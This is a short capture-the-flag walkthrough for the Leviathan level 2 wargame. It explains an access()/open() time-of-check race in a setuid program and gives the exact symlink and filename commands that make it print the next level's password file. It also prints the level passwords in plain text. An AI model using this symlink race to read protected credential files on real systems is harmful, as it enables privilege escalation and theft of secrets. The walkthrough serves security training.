# Level2 -> Level3

lvl2 pass; `mEh5PNl10e`

ltrace ./printfile "weird filename"

`access()` checks whether the calling process can access the file pathname. If pathname is a symbolic link, it is dereferenced.

The mode specifies the accessibility check(s) to be performed and 4 specifies read permission.

The access function has a vulnerability TOCTOU race (Time of Check to Time of Update).
The program calls the access(), then it calls the open(). In the small time between the two calls,
the file may have changed. A malicious user could substitute a file he has access to for a symbolic
link to something he doesn’t have access to between the access() and the open() calls.

Create a file with a space in the `tmp` directory; `mkdir /tmp/ttTT && touch /tmp/ttTT/pass\ status.txt`
Create a symbolic file for lvl3 pass to name pass in the `/tmp/ttTT` directory; `ln -s /etc/leviathan_pass/leviathan3 /tmp/ttTT/pass`
Exploit; `./printfile /tmp/ttTT/pass\ status.txt`

Password for leviathan3; `Q0G8j4sakn`


## Reference

[access(2) man page](https://linux.die.net/man/2/access)
[Fixing Races for Fum and Profit: How to use access(2)](https://www.usenix.org/legacy/publications/library/proceedings/sec04/tech/full_papers/dean/dean_html/accessopen.html)
